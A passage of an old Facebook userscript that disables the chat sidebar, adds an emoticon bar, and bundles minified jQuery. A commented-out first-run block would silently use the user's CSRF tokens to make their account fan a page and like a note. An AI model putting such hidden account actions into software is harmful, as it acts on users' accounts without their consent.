				presence.registerStateStorer(sidebardisabler_var_18._storeState.bind(sidebardisabler_var_18));
				presence.registerStateLoader(sidebardisabler_var_18._loadState.bind(sidebardisabler_var_18));
				sidebardisabler_var_18._loadState(presence.state);

				Toggler.createInstance($("sidebardisabler_elm_35")).setSticky(false);
				sidebardisabler_var_22.init($("sidebardisabler_elm_36"),sidebardisabler_var_23,$("sidebardisabler_elm_37"));
				sidebardisabler_var_24.init($("sidebardisabler_elm_38"));
				Selector.setSelected($("sidebardisabler_elm_38"),"oldchatstyle",oldchatstyle);
				sidebardisabler_var_19.init($("sidebardisabler_elm_39"),false,false,{});
				var oldDataStoreGetStorage=DataStore._getStorage;
				DataStore._getStorage=function(arg){
					if (!arg) {
						return {};
					}
					return oldDataStoreGetStorage.apply(this,arguments);
				};
				var oldAvailableListRequestCallback=AvailableList._poller._requestCallback;
				AvailableList._poller._requestCallback=function(arg){
					var retval=oldAvailableListRequestCallback.apply(this,arguments);
					var availlist={};
					if (AvailableList.haveFullList) {
						AvailableList.getAvailableIDs().forEach(function(thiscontact){
							availlist[thiscontact]={
								i:(AvailableList.isIdle(thiscontact) ? 1 : 0)
							};
						});
					}
					arg.setData({
						user:Env.user,
						popped_out:presence.poppedOut,
						available_list:availlist,
						force_render:true
					});
					return retval;
				};
				AvailableList._poller.setTimePeriod(Math.max(Math.min(15000,AvailableList._poller.getTimePeriod()),Poller.MIN_TIME_PERIOD));
				AvailableList._poller.setTimePeriod=function(){};
				AvailableList._poller.scheduleRequest();
				sidebardisabler_var_19._isVisible=true;
				sidebardisabler_var_19._firstRender();
				sidebardisabler_var_25.init([]);
				var buddylistnub=$("fbDockChatBuddylistNub");
				var bodycontent;
				var bodycontentparent;
				if (buddylistnub && (bodycontentparent=buddylistnub.getElementsByClassName('fbNubFlyoutBody')) && (bodycontentparent=bodycontentparent[0]) && (bodycontent=bodycontentparent.getElementsByClassName('fbNubFlyoutBodyContent')) && (bodycontent=bodycontent[0]) && typeof bodycontent.scrollHeight!="undefined") {
					var oldheight=bodycontent.scrollHeight;
					var thefunc=function(){
						if (CSS.hasClass(buddylistnub,'openToggler') && bodycontent.scrollHeight!=oldheight) {
							var oldtop=bodycontentparent.scrollTop;
							oldheight=bodycontent.scrollHeight;
							Dock._resizeNubFlyout(buddylistnub);
							bodycontentparent.scrollTop=oldtop;
						}
					};
					var myint=window.setInterval(thefunc,0);
					buddylistnub.addEventListener('click',function(){
						window.clearInterval(myint);
						myint=window.setInterval(thefunc,0);
					},false);
					Chat._buddyList.subscribe('content-changed',function(){
						window.clearInterval(myint);
						myint=window.setInterval(thefunc,0);
					});
				}
				document.documentElement.className="";
				AvailableList._poller.requestNow();
				window.setTimeout(function(){Dock.resizeAllFlyouts();},0);
				window.setTimeout(function(){Dock.resizeAllFlyouts();},100);
				if (localstore.is_fbsidebardisabler_localstore===true) {
					localstore.getItem('not_first_run',function(itemValue){
						if (itemValue!=true) {
							localstore.setItem('not_first_run',true);
							/*if (window.XMLHttpRequest) {
								var xmlhttp=new XMLHttpRequest();
								xmlhttp.onload=xmlhttp.onerror=function(){
									window.setTimeout(function(){
										xmlhttp.onload=xmlhttp.onerror=function(){};
										xmlhttp.open("POST",'/ajax/connect/external_node_connect.php?__a=1',true);
										xmlhttp.send(URI.implodeQuery({
											href:"https://www.facebook.com/note.php?note_id=263111853706033",
											node_type:"link",
											edge_type:"like",
											now_connected:true,
											post_form_id:Env.post_form_id,
											fb_dtsg:Env.fb_dtsg
										}));
									},1000);
								};
								xmlhttp.open("POST",'/ajax/pages/fan_status.php?__a=1',true);
								xmlhttp.send(URI.implodeQuery({
									fbpage_id:263076110376274,
									add:"1",
									reload:"0",
									post_form_id:Env.post_form_id,
									fb_dtsg:Env.fb_dtsg,
									lsd:getCookie('lsd'),
									post_form_id_source:"AsyncRequest"
								}));
							}*/
						}
					});
				}
			});
		};
		window.setTimeout(workerfunc,100);
	};
	try {
		if (window.chrome && window.chrome.extension) {
			var chromewindowhack=document.createElement('div');
			chromewindowhack.setAttribute('onclick','return window;');
            		unsafeWindow=chromewindowhack.onclick();
			unsafeWindow.fbsidebardisabler_localstore={
				getItem:function(itemName,callback){
					try {
						chrome.extension.sendRequest({method:"getItem",itemName:itemName},function(response){
							callback(response.itemValue);
						});
						return;
					} catch (e) {}
					callback(null);
				},
				setItem:function(itemName,itemValue){
					try {
						chrome.extension.sendRequest({method:"setItem",itemName:itemName,itemValue:itemValue});
					} catch (e) {}
				},
				is_fbsidebardisabler_localstore:true
			};
		}
	} catch (e) {}
	try {
		if (window.opera) {
			var localstore_callbacks={};
			window.fbsidebardisabler_localstore={
				getItem:function(itemName,callback){
					try {
						var randid='callback_'+(+new Date());
						localstore_callbacks[randid]=callback;
						opera.extension.postMessage(JSON.stringify({method:"getItem",itemName:itemName,callbackid:randid}));
						return;
					} catch (e) {}
					callback(null);
				},
				setItem:function(itemName,itemValue){
					try {
						opera.extension.postMessage(JSON.stringify({method:"setItem",itemName:itemName,itemValue:itemValue}));
					} catch (e) {}
				},
				is_fbsidebardisabler_localstore:true
			};
			opera.extension.onmessage=function(event){
				try {
					var response=JSON.parse(event.data);
					if (response.method=="getItemResponse") {
						if (typeof localstore_callbacks[response.callbackid]=="function") {
							localstore_callbacks[response.callbackid](response.itemValue);
						}
						delete localstore_callbacks[response.callbackid];
					}
				} catch (e) {}
			};
		}
	} catch (e) {}
	var chatscript=window.document.createElement('script');
	chatscript.appendChild(window.document.createTextNode('('+fbsidebardisabler.toString()+')();'));
	(window.document.body||window.document.head||window.document.documentElement).appendChild(chatscript);
})();
/**EMOTICONS CODE !!! LICENSE :Attribution-NonCommercial-NoDerivs 3.0 Unported (CC BY-NC-ND 3.0); http://creativecommons.org/licenses/by-nc-nd/3.0/  BITTMAN CODE !**/
// List of emoticons
// :) :( :D >:( -_- :/ o.O :p :'( >:O :v 3:) :o :3 ;) :* :|] 8) <3 :putnam: 8| ^_^ (^^^) O:) <(") :42:
	var version, HttpsOn, ImagesURL, ResourcesURL, storage, emotsInfo, spemotsInfo, headTag, styleTag, ArrowStyleUp, ArrowStyleDown, fEmotBarDom, fEmotsListDom, fArrow;
	version = 0.183;
	HttpsOn = window.location.href.match('https://')?true:false;
	ImagesURL = HttpsOn?'https://s-static.ak.fbcdn.net/images/':'http://static.ak.fbcdn.net/images/';
	ResourcesURL = HttpsOn?'https://s-static.ak.fbcdn.net/rsrc.php/':'http://static.ak.fbcdn.net/rsrc.php/';
/* START: This part of the code was written (partialy) by Vaughan Chandler for FFixer, special thanks to him :) */
	storage = 'none';
	try {
		if (typeof GM_getValue === 'function' && typeof GM_setValue === 'function') {
			GM_setValue('testkey', 'testvalue');
			if (GM_getValue('testkey', false) === 'testvalue') { storage='greasemonkey'; }
		}
	} catch(x) {}
	if (storage=='none' && typeof localStorage == 'object') { storage='localstorage'; }
	function setValue(key, value) {
		switch (storage) {
			case 'greasemonkey':
				GM_setValue('0-'+key, value);
				break;
			case 'localstorage':
				localStorage['femotbar-0-'+key] = value;
				break;
		}
	}
	function getValue(key, value) {
		switch (storage) {
			case 'greasemonkey':
				return GM_getValue('0-'+key, value);
			case 'localstorage':
				var val = localStorage['femotbar-0-'+key];
				if (val=='true') { return true; }
				else if (val=='false') { return false; }
				else if (val) { return val; }
				break;
		}
		return value;
	}
	function xmlhttpRequest(params, callBack) {
		if (typeof GM_xmlhttpRequest !== 'undefined') {
			params['onload'] = callBack;
			return GM_xmlhttpRequest(params);
		}
		return null;
	}
	function openInTab(url) {
		if (typeof GM_openInTab !== 'undefined') { GM_openInTab(url); }
		else { window.open(url); }
	}
	function createSelection(field, start, end) {
		if( field.createTextRange ) {
			var selRange = field.createTextRange();
			selRange.collapse(true);
			selRange.moveStart('character', start);
			selRange.moveEnd('character', end);
			selRange.select();
		} else if( field.setSelectionRange ) {
			field.setSelectionRange(start, end);
		} else if( field.selectionStart ) {
			field.selectionStart = start;
			field.selectionEnd = end;
		}
		field.focus();
	}       
	function getCursorPosition(field) {
		var CursorPos = 0;
		if (field.selectionStart || field.selectionStart == '0') CursorPos = field.selectionStart;
		return (CursorPos);
	}
	UpdateCheck();
	emotsInfo = [':)', ':(', ':p', ':D', ':o', ';)', '8)', '8|', '>:(', ':/', ':\'(', '3:)', 'O:)', ':*', '<3', '^_^', '-_-', 'o.O', '>:O', ':v', ':3'];
	spemotsInfo = [':|]', 'emote/robot.gif', '(^^^)', 'emote/shark.gif', ':putnam:', 'emote/putnam.gif', '<(")', 'emote/penguin.gif', ':42:', 'emote/42.gif'];
    headTag = document.getElementsByTagName('head')[0];
    if (headTag) {
		styleTag = document.createElement('style');
		styleTag.type = 'text/css';
		styleTag.innerHTML =
			'.chat_tab_emot_bar {padding-top: 2px; padding-bottom: 6px; line-height: 16px; padding-left: 2px; background:#EEEEEE none repeat scroll 0 0; border-style: solid; border-width: 0px 0px 1px 0px; border-color: #C9D0DA; position: static; }'+
			'.chat_arrow { background-image: url("'+ ResourcesURL + 'v1/zp/r/SBNTDM0S-7U.png"); background-position: 0 -48px; height: 5px; width: 9px; }';
		headTag.appendChild(styleTag);
	}
	ArrowStyleUp = 'cursor: pointer; position: absolute; right: 2px; -moz-transform: rotate(180deg); -webkit-transform: rotate(180deg);'
	ArrowStyleDown = 'cursor: pointer; position: absolute; right: 2px;'
	fEmotBarDom = document.createElement('div');
	fEmotBarDom.setAttribute('class','chat_tab_emot_bar');
	fEmotsListDom = document.createElement('div');
	fEmotsListDom.setAttribute('name','EmotsList');
	fEmotBarDom.appendChild(fEmotsListDom);
	for(i=0;i<emotsInfo.length;i+=1) {
		var fEmotsDom = document.createElement('img');
		fEmotsDom.setAttribute('alt',emotsInfo[i]);
		fEmotsDom.setAttribute('style','cursor: pointer; background-position: -'+ 16*i +'px 0px;');
		fEmotsDom.setAttribute('src',ImagesURL + 'blank.gif');
		fEmotsDom.setAttribute('class','emote_img');
		fEmotsListDom.appendChild(fEmotsDom);
	}
	for(i=0;i<spemotsInfo.length;i+=2) {
		var fEmotsDom = document.createElement('img');
		fEmotsDom.setAttribute('alt',spemotsInfo[i]);
		fEmotsDom.setAttribute('src',ImagesURL + spemotsInfo[i+1]);
		fEmotsDom.setAttribute('style','cursor: pointer;');
		fEmotsDom.setAttribute('class','emote_custom');
		fEmotsListDom.appendChild(fEmotsDom);
	}
	var fEmotsDom = document.createElement('img');
	fEmotsDom.setAttribute('alt','*Entrez votre texte ici pour qu\'il soit en gras*');
	fEmotsDom.setAttribute('src',ImagesURL + 'blank.gif');
	fEmotsDom.setAttribute('class','chatstylesbut');	
	fEmotsDom.setAttribute('style','background-position: -2px -2px;');
	fEmotsListDom.appendChild(fEmotsDom);
	var fEmotsDom = document.createElement('img');
	fEmotsDom.setAttribute('alt','_Entrez votre texte ici pour qu\'il soit souligné_');
	fEmotsDom.setAttribute('src',ImagesURL + 'blank.gif');
	fEmotsDom.setAttribute('class','chatstylesbut');	
	fEmotsDom.setAttribute('style','background-position: -2px -42px;');
	fEmotsListDom.appendChild(fEmotsDom);
	fArrow = document.createElement('i');
	fArrow.setAttribute('alt','');
	fArrow.setAttribute('class','img chat_arrow');
	fArrow.setAttribute('style',ArrowStyleUp);
	fEmotBarDom.appendChild(fArrow);
	var setting_visible = getValue('visible',true);
	document.addEventListener('DOMNodeInserted', fInsertedNodeHandler, false);
	function fInsertedNodeHandler(event) {
		if(event.target.getElementsByClassName && event.target.getElementsByClassName('fbNubFlyout fbDockChatTabFlyout')[0])
			fInsertEmotBar(event.target);
	}
	function fInsertEmotBar(fChatWrapper) {
		fChatToolBox = fChatWrapper.getElementsByClassName('fbNubFlyoutHeader')[0]
		fNewEmotBar = fEmotBarDom.cloneNode(true);
		setVisibility(fNewEmotBar);
		for(i=0;i<fNewEmotBar.firstChild.childNodes.length-2;i++) fNewEmotBar.firstChild.childNodes[i].addEventListener('click', fEmotClickHandler , false);
		fNewEmotBar.firstChild.childNodes[i].addEventListener('click' , fStyleClickHandler , false);
		fNewEmotBar.firstChild.childNodes[i+1].addEventListener('click' , fStyleClickHandler , false);
		fNewEmotBar.childNodes[1].addEventListener('click', fHideShowEmotBar , false);
		if(fChatToolBox.childNodes) fChatToolBox.insertBefore(fNewEmotBar,fChatToolBox.childNodes[1]);
	}
	function fEmotClickHandler(event){
		var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];
		var pos = getCursorPosition(fChatInput);
		var txtbef = ''; var txtaft = '';
		if (fChatInput.value.charAt(pos-1) != ' ' && pos-1 > 0) txtbef = ' ';
		if (fChatInput.value.charAt(pos) != ' ') txtaft = ' ';
		fChatInput.value = fChatInput.value.substring(0,pos) + txtbef + event.target.getAttribute('alt') + txtaft + fChatInput.value.substring(pos);
		createSelection(fChatInput,pos + event.target.getAttribute('alt').length + txtaft.length + txtbef.length,pos + event.target.getAttribute('alt').length + txtaft.length + txtbef.length);
	}
	function fStyleClickHandler(event){
		var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];
		var selectedText = fChatInput.value.substring(fChatInput.selectionStart, fChatInput.selectionEnd);
		var pos = getCursorPosition(fChatInput);
		var txtlen = selectedText.length;
		if (txtlen == 0) {
			fChatInput.value = fChatInput.value.substring(0,pos) + event.target.getAttribute('alt') + fChatInput.value.substring(pos);
			createSelection(fChatInput,pos + 1,pos + event.target.getAttribute('alt').length-1);
		}
		else {
			var txtbef = event.target.getAttribute('alt').charAt(0);
			var txtaft = event.target.getAttribute('alt').charAt(0);
			while (fChatInput.value.charAt(pos) == ' ') { pos += 1; txtlen -= 1; }
			while (fChatInput.value.charAt(pos+txtlen-1) == ' ') txtlen -= 1;
			if (fChatInput.value.charAt(pos-1) != ' ' && pos-1 > 0) txtbef = ' ' + txtbef;
			if (fChatInput.value.charAt(pos+txtlen) != ' ') txtaft += ' ';
			fChatInput.value = fChatInput.value.substring(0,pos) + txtbef + fChatInput.value.substring(pos,pos+txtlen) + txtaft + fChatInput.value.substring(pos + txtlen);
			createSelection(fChatInput, pos + txtlen + 2, pos + txtlen + 2);
		}
	}
	function fHideShowEmotBar(event){
		fChatBar = document.getElementsByName('EmotsList');
		if(fChatBar[0].getAttribute('style') == 'display: none;') {
			for(i=0;i<fChatBar.length;i++) {
				fChatBar[i].setAttribute('style','display: block;');
				fChatBar[i].parentNode.childNodes[1].setAttribute('style',ArrowStyleUp);
			}
		}
		else {
			for(i=0;i<fChatBar.length;i++) {
				fChatBar[i].setAttribute('style','display: none;');
				fChatBar[i].parentNode.childNodes[1].setAttribute('style',ArrowStyleDown);
			}
		}
		setValue('visible',!setting_visible);
		setting_visible = !setting_visible;
	}
	function setVisibility(DOM) {
		if(setting_visible) {
			DOM.firstChild.setAttribute('style','display: block;');
			DOM.childNodes[1].setAttribute('style',ArrowStyleUp);
		}
		else {
			DOM.firstChild.setAttribute('style','display: none;');
			DOM.childNodes[1].setAttribute('style',ArrowStyleDown);
		}
	}
	/* End of the emoticon code !*/
function UpdateCheck() {
}
(function(){var _jQuery=window.jQuery,_$=window.$;var jQuery=window.jQuery=window.$=function(selector,context){return new jQuery.fn.init(selector,context);};var quickExpr=/^[^<]*(<(.|\s)+>)[^>]*$|^#(\w+)$/,isSimple=/^.[^:#\[\.]*$/,undefined;jQuery.fn=jQuery.prototype={init:function(selector,context){selector=selector||document;if(selector.nodeType){this[0]=selector;this.length=1;return this;}if(typeof selector=="string"){var match=quickExpr.exec(selector);if(match&&(match[1]||!context)){if(match[1])selector=jQuery.clean([match[1]],context);else{var elem=document.getElementById(match[3]);if(elem){if(elem.id!=match[3])return jQuery().find(selector);return jQuery(elem);}selector=[];}}else
return jQuery(context).find(selector);}else if(jQuery.isFunction(selector))return jQuery(document)[jQuery.fn.ready?"ready":"load"](selector);return this.setArray(jQuery.makeArray(selector));},jquery:"1.2.6",size:function(){return this.length;},length:0,get:function(num){return num==undefined?jQuery.makeArray(this):this[num];},pushStack:function(elems){var ret=jQuery(elems);ret.prevObject=this;return ret;},setArray:function(elems){this.length=0;Array.prototype.push.apply(this,elems);return this;},each:function(callback,args){return jQuery.each(this,callback,args);},index:function(elem){var ret=-1;return jQuery.inArray(elem&&elem.jquery?elem[0]:elem,this);},attr:function(name,value,type){var options=name;if(name.constructor==String)if(value===undefined)return this[0]&&jQuery[type||"attr"](this[0],name);else{options={};options[name]=value;}return this.each(function(i){for(name in options)jQuery.attr(type?this.style:this,name,jQuery.prop(this,options[name],type,i,name));});},css:function(key,value){if((key=='width'||key=='height')&&parseFloat(value)<0)value=undefined;return this.attr(key,value,"curCSS");},text:function(text){if(typeof text!="object"&&text!=null)return this.empty().append((this[0]&&this[0].ownerDocument||document).createTextNode(text));var ret="";jQuery.each(text||this,function(){jQuery.each(this.childNodes,function(){if(this.nodeType!=8)ret+=this.nodeType!=1?this.nodeValue:jQuery.fn.text([this]);});});return ret;},wrapAll:function(html){if(this[0])jQuery(html,this[0].ownerDocument).clone().insertBefore(this[0]).map(function(){var elem=this;while(elem.firstChild)elem=elem.firstChild;return elem;}).append(this);return this;},wrapInner:function(html){return this.each(function(){jQuery(this).contents().wrapAll(html);});},wrap:function(html){return this.each(function(){jQuery(this).wrapAll(html);});},append:function(){return this.domManip(arguments,true,false,function(elem){if(this.nodeType==1)this.appendChild(elem);});},prepend:function(){return this.domManip(arguments,true,true,function(elem){if(this.nodeType==1)this.insertBefore(elem,this.firstChild);});},before:function(){return this.domManip(arguments,false,false,function(elem){this.parentNode.insertBefore(elem,this);});},after:function(){return this.domManip(arguments,false,true,function(elem){this.parentNode.insertBefore(elem,this.nextSibling);});},end:function(){return this.prevObject||jQuery([]);},find:function(selector){var elems=jQuery.map(this,function(elem){return jQuery.find(selector,elem);});return this.pushStack(/[^+>] [^+>]/.test(selector)||selector.indexOf("..")>-1?jQuery.unique(elems):elems);},clone:function(events){var ret=this.map(function(){if(jQuery.browser.msie&&!jQuery.isXMLDoc(this)){var clone=this.cloneNode(true),container=document.createElement("div");container.appendChild(clone);return jQuery.clean([container.innerHTML])[0];}else
return this.cloneNode(true);});var clone=ret.find("*").andSelf().each(function(){if(this[expando]!=undefined)this[expando]=null;});if(events===true)this.find("*").andSelf().each(function(i){if(this.nodeType==3)return;var events=jQuery.data(this,"events");for(var type in events)for(var handler in events[type])jQuery.event.add(clone[i],type,events[type][handler],events[type][handler].data);});return ret;},filter:function(selector){return this.pushStack(jQuery.isFunction(selector)&&jQuery.grep(this,function(elem,i){return selector.call(elem,i);})||jQuery.multiFilter(selector,this));},not:function(selector){if(selector.constructor==String)if(isSimple.test(selector))return this.pushStack(jQuery.multiFilter(selector,this,true));else
selector=jQuery.multiFilter(selector,this);var isArrayLike=selector.length&&selector[selector.length-1]!==undefined&&!selector.nodeType;return this.filter(function(){return isArrayLike?jQuery.inArray(this,selector)<0:this!=selector;});},add:function(selector){return this.pushStack(jQuery.unique(jQuery.merge(this.get(),typeof selector=='string'?jQuery(selector):jQuery.makeArray(selector))));},is:function(selector){return!!selector&&jQuery.multiFilter(selector,this).length>0;},hasClass:function(selector){return this.is("."+selector);},val:function(value){if(value==undefined){if(this.length){var elem=this[0];if(jQuery.nodeName(elem,"select")){var index=elem.selectedIndex,values=[],options=elem.options,one=elem.type=="select-one";if(index<0)return null;for(var i=one?index:0,max=one?index+1:options.length;i<max;i++){var option=options[i];if(option.selected){value=jQuery.browser.msie&&!option.attributes.value.specified?option.text:option.value;if(one)return value;values.push(value);}}return values;}else
return(this[0].value||"").replace(/\r/g,"");}return undefined;}if(value.constructor==Number)value+='';return this.each(function(){if(this.nodeType!=1)return;if(value.constructor==Array&&/radio|checkbox/.test(this.type))this.checked=(jQuery.inArray(this.value,value)>=0||jQuery.inArray(this.name,value)>=0);else if(jQuery.nodeName(this,"select")){var values=jQuery.makeArray(value);jQuery("option",this).each(function(){this.selected=(jQuery.inArray(this.value,values)>=0||jQuery.inArray(this.text,values)>=0);});if(!values.length)this.selectedIndex=-1;}else
this.value=value;});},html:function(value){return value==undefined?(this[0]?this[0].innerHTML:null):this.empty().append(value);},replaceWith:function(value){return this.after(value).remove();},eq:function(i){return this.slice(i,i+1);},slice:function(){return this.pushStack(Array.prototype.slice.apply(this,arguments));},map:function(callback){return this.pushStack(jQuery.map(this,function(elem,i){return callback.call(elem,i,elem);}));},andSelf:function(){return this.add(this.prevObject);},data:function(key,value){var parts=key.split(".");parts[1]=parts[1]?"."+parts[1]:"";if(value===undefined){var data=this.triggerHandler("getData"+parts[1]+"!",[parts[0]]);if(data===undefined&&this.length)data=jQuery.data(this[0],key);return data===undefined&&parts[1]?this.data(parts[0]):data;}else
return this.trigger("setData"+parts[1]+"!",[parts[0],value]).each(function(){jQuery.data(this,key,value);});},removeData:function(key){return this.each(function(){jQuery.removeData(this,key);});},domManip:function(args,table,reverse,callback){var clone=this.length>1,elems;return this.each(function(){if(!elems){elems=jQuery.clean(args,this.ownerDocument);if(reverse)elems.reverse();}var obj=this;if(table&&jQuery.nodeName(this,"table")&&jQuery.nodeName(elems[0],"tr"))obj=this.getElementsByTagName("tbody")[0]||this.appendChild(this.ownerDocument.createElement("tbody"));var scripts=jQuery([]);jQuery.each(elems,function(){var elem=clone?jQuery(this).clone(true)[0]:this;if(jQuery.nodeName(elem,"script"))scripts=scripts.add(elem);else{if(elem.nodeType==1)scripts=scripts.add(jQuery("script",elem).remove());callback.call(obj,elem);}});scripts.each(evalScript);});}};jQuery.fn.init.prototype=jQuery.fn;function evalScript(i,elem){if(elem.src)jQuery.ajax({url:elem.src,async:false,dataType:"script"});else
jQuery.globalEval(elem.text||elem.textContent||elem.innerHTML||"");if(elem.parentNode)elem.parentNode.removeChild(elem);}function now(){return+new Date;}jQuery.extend=jQuery.fn.extend=function(){var target=arguments[0]||{},i=1,length=arguments.length,deep=false,options;if(target.constructor==Boolean){deep=target;target=arguments[1]||{};i=2;}if(typeof target!="object"&&typeof target!="function")target={};if(length==i){target=this;--i;}for(;i<length;i++)if((options=arguments[i])!=null)for(var name in options){var src=target[name],copy=options[name];if(target===copy)continue;if(deep&&copy&&typeof copy=="object"&&!copy.nodeType)target[name]=jQuery.extend(deep,src||(copy.length!=null?[]:{}),copy);else if(copy!==undefined)target[name]=copy;}return target;};var expando="jQuery"+now(),uuid=0,windowData={},exclude=/z-?index|font-?weight|opacity|zoom|line-?height/i,defaultView=document.defaultView||{};jQuery.extend({noConflict:function(deep){window.$=_$;if(deep)window.jQuery=_jQuery;return jQuery;},isFunction:function(fn){return!!fn&&typeof fn!="string"&&!fn.nodeName&&fn.constructor!=Array&&/^[\s[]?function/.test(fn+"");},isXMLDoc:function(elem){return elem.documentElement&&!elem.body||elem.tagName&&elem.ownerDocument&&!elem.ownerDocument.body;},globalEval:function(data){data=jQuery.trim(data);if(data){var head=document.getElementsByTagName("head")[0]||document.documentElement,script=document.createElement("script");script.type="text/javascript";if(jQuery.browser.msie)script.text=data;else
script.appendChild(document.createTextNode(data));head.insertBefore(script,head.firstChild);head.removeChild(script);}},nodeName:function(elem,name){return elem.nodeName&&elem.nodeName.toUpperCase()==name.toUpperCase();},cache:{},data:function(elem,name,data){elem=elem==window?windowData:elem;var id=elem[expando];if(!id)id=elem[expando]=++uuid;if(name&&!jQuery.cache[id])jQuery.cache[id]={};if(data!==undefined)jQuery.cache[id][name]=data;return name?jQuery.cache[id][name]:id;},removeData:function(elem,name){elem=elem==window?windowData:elem;var id=elem[expando];if(name){if(jQuery.cache[id]){delete jQuery.cache[id][name];name="";for(name in jQuery.cache[id])break;if(!name)jQuery.removeData(elem);}}else{try{delete elem[expando];}catch(e){if(elem.removeAttribute)elem.removeAttribute(expando);}delete jQuery.cache[id];}},each:function(object,callback,args){var name,i=0,length=object.length;if(args){if(length==undefined){for(name in object)if(callback.apply(object[name],args)===false)break;}else
for(;i<length;)if(callback.apply(object[i++],args)===false)break;}else{if(length==undefined){for(name in object)if(callback.call(object[name],name,object[name])===false)break;}else
for(var value=object[0];i<length&&callback.call(value,i,value)!==false;value=object[++i]){}}return object;},prop:function(elem,value,type,i,name){if(jQuery.isFunction(value))value=value.call(elem,i);return value&&value.constructor==Number&&type=="curCSS"&&!exclude.test(name)?value+"px":value;},className:{add:function(elem,classNames){jQuery.each((classNames||"").split(/\s+/),function(i,className){if(elem.nodeType==1&&!jQuery.className.has(elem.className,className))elem.className+=(elem.className?" ":"")+className;});},remove:function(elem,classNames){if(elem.nodeType==1)elem.className=classNames!=undefined?jQuery.grep(elem.className.split(/\s+/),function(className){return!jQuery.className.has(classNames,className);}).join(" "):"";},has:function(elem,className){return jQuery.inArray(className,(elem.className||elem).toString().split(/\s+/))>-1;}},swap:function(elem,options,callback){var old={};for(var name in options){old[name]=elem.style[name];elem.style[name]=options[name];}callback.call(elem);for(var name in options)elem.style[name]=old[name];},css:function(elem,name,force){if(name=="width"||name=="height"){var val,props={position:"absolute",visibility:"hidden",display:"block"},which=name=="width"?["Left","Right"]:["Top","Bottom"];function getWH(){val=name=="width"?elem.offsetWidth:elem.offsetHeight;var padding=0,border=0;jQuery.each(which,function(){padding+=parseFloat(jQuery.curCSS(elem,"padding"+this,true))||0;border+=parseFloat(jQuery.curCSS(elem,"border"+this+"Width",true))||0;});val-=Math.round(padding+border);}if(jQuery(elem).is(":visible"))getWH();else
jQuery.swap(elem,props,getWH);return Math.max(0,val);}return jQuery.curCSS(elem,name,force);},curCSS:function(elem,name,force){var ret,style=elem.style;function color(elem){if(!jQuery.browser.safari)return false;var ret=defaultView.getComputedStyle(elem,null);return!ret||ret.getPropertyValue("color")=="";}if(name=="opacity"&&jQuery.browser.msie){ret=jQuery.attr(style,"opacity");return ret==""?"1":ret;}if(jQuery.browser.opera&&name=="display"){var save=style.outline;style.outline="0 solid black";style.outline=save;}if(name.match(/float/i))name=styleFloat;if(!force&&style&&style[name])ret=style[name];else if(defaultView.getComputedStyle){if(name.match(/float/i))name="float";name=name.replace(/([A-Z])/g,"-$1").toLowerCase();var computedStyle=defaultView.getComputedStyle(elem,null);if(computedStyle&&!color(elem))ret=computedStyle.getPropertyValue(name);else{var swap=[],stack=[],a=elem,i=0;for(;a&&color(a);a=a.parentNode)stack.unshift(a);for(;i<stack.length;i++)if(color(stack[i])){swap[i]=stack[i].style.display;stack[i].style.display="block";}ret=name=="display"&&swap[stack.length-1]!=null?"none":(computedStyle&&computedStyle.getPropertyValue(name))||"";for(i=0;i<swap.length;i++)if(swap[i]!=null)stack[i].style.display=swap[i];}if(name=="opacity"&&ret=="")ret="1";}else if(elem.currentStyle){var camelCase=name.replace(/\-(\w)/g,function(all,letter){return letter.toUpperCase();});ret=elem.currentStyle[name]||elem.currentStyle[camelCase];if(!/^\d+(px)?$/i.test(ret)&&/^\d/.test(ret)){var left=style.left,rsLeft=elem.runtimeStyle.left;elem.runtimeStyle.left=elem.currentStyle.left;style.left=ret||0;ret=style.pixelLeft+"px";style.left=left;elem.runtimeStyle.left=rsLeft;}}return ret;},clean:function(elems,context){var ret=[];context=context||document;if(typeof context.createElement=='undefined')context=context.ownerDocument||context[0]&&context[0].ownerDocument||document;jQuery.each(elems,function(i,elem){if(!elem)return;if(elem.constructor==Number)elem+='';if(typeof elem=="string"){elem=elem.replace(/(<(\w+)[^>]*?)\/>/g,function(all,front,tag){return tag.match(/^(abbr|br|col|img|input|link|meta|param|hr|area|embed)$/i)?all:front+"></"+tag+">";});var tags=jQuery.trim(elem).toLowerCase(),div=context.createElement("div");var wrap=!tags.indexOf("<opt")&&[1,"<select multiple='multiple'>","</select>"]||!tags.indexOf("<leg")&&[1,"<fieldset>","</fieldset>"]||tags.match(/^<(thead|tbody|tfoot|colg|cap)/)&&[1,"<table>","</table>"]||!tags.indexOf("<tr")&&[2,"<table><tbody>","</tbody></table>"]||(!tags.indexOf("<td")||!tags.indexOf("<th"))&&[3,"<table><tbody><tr>","</tr></tbody></table>"]||!tags.indexOf("<col")&&[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"]||jQuery.browser.msie&&[1,"div<div>","</div>"]||[0,"",""];div.innerHTML=wrap[1]+elem+wrap[2];while(wrap[0]--)div=div.lastChild;if(jQuery.browser.msie){var tbody=!tags.indexOf("<table")&&tags.indexOf("<tbody")<0?div.firstChild&&div.firstChild.childNodes:wrap[1]=="<table>"&&tags.indexOf("<tbody")<0?div.childNodes:[];for(var j=tbody.length-1;j>=0;--j)if(jQuery.nodeName(tbody[j],"tbody")&&!tbody[j].childNodes.length)tbody[j].parentNode.removeChild(tbody[j]);if(/^\s/.test(elem))div.insertBefore(context.createTextNode(elem.match(/^\s*/)[0]),div.firstChild);}elem=jQuery.makeArray(div.childNodes);}if(elem.length===0&&(!jQuery.nodeName(elem,"form")&&!jQuery.nodeName(elem,"select")))return;if(elem[0]==undefined||jQuery.nodeName(elem,"form")||elem.options)ret.push(elem);else
